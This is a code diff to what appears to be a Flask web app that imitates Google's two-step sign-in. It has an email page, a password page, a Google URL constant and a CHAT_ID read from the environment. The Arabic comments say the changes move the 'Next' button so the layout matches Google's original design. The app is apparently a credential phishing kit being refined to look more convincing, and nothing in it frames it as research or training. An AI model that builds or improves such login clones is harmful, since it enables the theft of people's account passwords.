@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: مطابقة تماماً لتوزيع المسافات في الصورة المطلوبة
+# الصفحة الأولى: زر التالي في أقصى اليمين تماماً مثل تصميم Google الأصلي
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -55,7 +55,6 @@ def step1():
             padding: 24px 20px 24px 20px;
         }
         
-        /* حاوية واحدة رئيسية تحتوي كل عناصر الصفحة لضمان التنسيق السليم */
         .login-card {
             width: 100%;
             max-width: 450px;
@@ -152,12 +151,12 @@ def step1():
         }
         .signup-link:hover { text-decoration: underline; }
 
-        /* حاوية زر التالي السفلي الكبيرة تماماً في أسفل الشاشة */
+        /* تم تعديل الحاوية لتكون في أقصى اليمين تماماً (flex-end في اللغة العربية RTL) */
         .footer-action {
             width: 100%;
             max-width: 450px;
             display: flex;
-            justify-content: flex-start;
+            justify-content: flex-end;
             align-items: center;
         }
 
@@ -216,7 +215,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور متوافقة بنفس التنسيق تماماً
+# الصفحة الثانية: إدخال كلمة المرور (زر التالي في أقصى اليمين أيضاً)
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -351,7 +350,7 @@ def step2():
             width: 100%;
             max-width: 450px;
             display: flex;
-            justify-content: flex-start;
+            justify-content: flex-end;
             align-items: center;
         }
 
